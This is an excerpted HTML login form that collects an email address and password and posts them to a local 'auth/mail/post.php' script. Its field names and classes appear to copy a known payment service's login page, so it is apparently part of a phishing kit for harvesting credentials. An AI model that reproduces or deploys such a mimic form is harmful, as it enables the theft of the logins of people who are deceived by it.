...
<form action="./auth/mail/post.php?login_error=false"   method="post"   onsubmit="return (validate()  && ray.ajax())">
	...
	<div id="passwordSection" class="clearfix"><div class="textInput" id="login_emaildiv">
		...
		<div class="fieldWrapper"><label for="email" class="fieldLabel">Email address
			...
			</label><input id="email" name="login_email" type="email" class="hasHelp  validateEmpty" value="" pattern="^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([\w-]{2,6}(?:\.[\w-]{2})?)$" placeholder="Email address"  autocomplete="on" title="Email address is required."  x-moz-errormessage="Email address is required." required="required" 	/></div>
			...
			<div class="textInput lastInputField" id="login_passworddiv"><div class="fieldWrapper"><label for="password" class="fieldLabel">Password</label>
				...
				<input id="password" name="login_password" type="password" class="hasHelp  validateEmpty" value=""		placeholder="Enter your password"	 title="Password is required"  x-moz-errormessage="Password is required" 	required="required"  /></div>
